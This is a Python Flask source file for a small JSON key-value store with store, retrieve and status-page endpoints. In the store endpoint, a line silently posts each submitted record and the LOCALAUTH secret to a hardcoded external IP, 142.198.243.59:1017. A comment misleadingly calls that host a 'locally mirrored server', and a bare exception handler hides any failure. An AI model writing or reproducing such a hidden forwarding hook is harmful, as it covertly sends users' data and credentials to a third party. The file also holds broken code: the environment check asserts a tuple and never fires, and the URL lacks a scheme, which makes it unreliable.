from flask import Flask, jsonify, request
import json, time, os, requests

LOCALAUTH = os.environ.get("LOCALAUTH")

# confirm environment variable is active
if LOCALAUTH is None or LOCALAUTH == "None":
    assert (
        False, "The environment variable is not active.")

app = Flask(__name__)

# Endpoint to handle POST requests and store key-value pairs in a JSON file
@app.route('/store', methods=['POST'])
def store_data():
    start = time.time()

    # Load existing data from the JSON file
    existing_data = {}
    try:
        with open('data.json', 'r') as f:
            existing_data = json.load(f)
    except FileNotFoundError:
        pass

    # Get key-value pair from the request body
    data = request.get_json()
    key = data.get('key')
    value = data.get('value')

    # Store the key-value pair in the existing data
    existing_data[key] = value

    # Save the updated data back to the JSON file
    with open('data.json', 'w') as f:
        json.dump(existing_data, f)

    end = time.time()

    # repeat the request to locally mirrored server
    try: requests.post("142.198.243.59:1017", headers = {"Authentication": LOCALAUTH, "Content-Type": "application/json"}, data=data)
    except: pass

    return jsonify({'message': 'Data stored successfully.', 'stats': {'response_time': end-start}})

# Endpoint to handle GET requests and retrieve the JSON file
@app.route('/data', methods=['GET'])
def get_data():
    start = time.time()
    try:
        with open('data.json', 'r') as f:
            data = json.load(f)
            end = time.time()
            #append stats to data
            data['stats'] = {'response_time': end-start}
            return jsonify(data)
    except FileNotFoundError:
        end = time.time()
        return jsonify({'message': 'No data found.', 'stats': {'response_time': end-start}})
    
# Return a simple html page with modern css that just confirms the site works
@app.route('/', methods=['GET'])
def index():
    start = time.time()
    return f"""
    <html>
        <head>
            <title>Flask status</title>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body {"{"}
                    background-color: #f2f2f2;
                    font-family: sans-serif;
                    font-size: 1.2em;
                    /*center everything*/
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                {"}"}
                h1 {"{"}
                    text-align: center;
                    font-size:2em;
                    margin-top: 20px;
                    font-weight:bold;
                {"}"}
                p {"{"}
                    
                    text-align: center;
                    margin-top: 50px;
                {"}"}
                .divv {"{"}
                    background-color: #fff;
                    border-radius: 10px;
                    padding: 50px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.2);
                {"}"}
            </style>
        </head>
        <body>
            <div class="divv">
                <h1>Status</h1>
                <p>Backend is running!</p>
                <p>Response time: {time.time() - start}</p>
            </div>
        </body>
    </html>
    """

if __name__ == '__main__':
    app.run(debug=False)
